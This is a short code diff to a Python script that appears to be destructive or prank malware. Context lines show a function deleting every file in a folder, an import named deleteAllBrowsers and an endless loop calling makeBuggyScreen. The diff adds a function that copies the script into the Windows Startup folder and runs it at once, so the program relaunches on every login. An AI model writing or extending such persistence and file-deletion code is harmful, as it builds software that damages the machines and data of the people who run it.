@@ -9,7 +9,7 @@ from utils.deleteAllBrowsers import objects
 from src.HTTPLib import HttpClient
 from pathlib import Path
 
-
+import shutil
 import os
 import sys
 
@@ -60,6 +60,13 @@ def REMPROM():
     for file_name in file_list:
         os.remove(os.path.join(file_path, file_name))
 
+def add_to_startup():
+    file_path = os.path.abspath(__file__)
+    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
+    shutil.copy(file_path, startup_folder)
+
+
+add_to_startup()
 
 while True:
     makeBuggyScreen()
